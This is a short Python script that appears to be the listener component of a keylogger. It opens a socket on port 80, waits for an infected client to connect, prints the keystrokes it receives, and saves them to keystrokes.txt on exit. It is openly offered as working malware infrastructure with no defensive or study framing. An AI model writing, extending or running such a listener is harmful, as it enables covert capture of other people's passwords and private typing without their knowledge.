# Modules
import socket,sys

# Variables to be used
HOST = "0.0.0.0"
PORT = 80
BUFFER = 1024

# Waiting for connection
def listener():
  global incoming,s
  s = socket.socket()
  s.bind((HOST,PORT))
  s.listen(1)
  print(f"Listening as {HOST}:{PORT}")
  incoming,addr = s.accept()
  print(f"Connected to {addr[0]}:{addr[1]}")
  print("\nListening for keystrokes")
  
# Writing the whole text to a txt file
def write_to_file(text,dest):
  with open(dest,"w") as f:
    f.write(text)
    f.close()

# Start listening
if __name__ == "__main__":
  listener()
  while True:
    try:
      print(incoming.recv(BUFFER).decode())
    except KeyboardInterrupt:
      write_to_file(incoming.recv(BUFFER).decode(),"keystrokes.txt")
      print("Exiting...")
      s.close()
      sys.exit()
    except ConnectionResetError:
      print("The connection was closed by the client")
      sys.exit()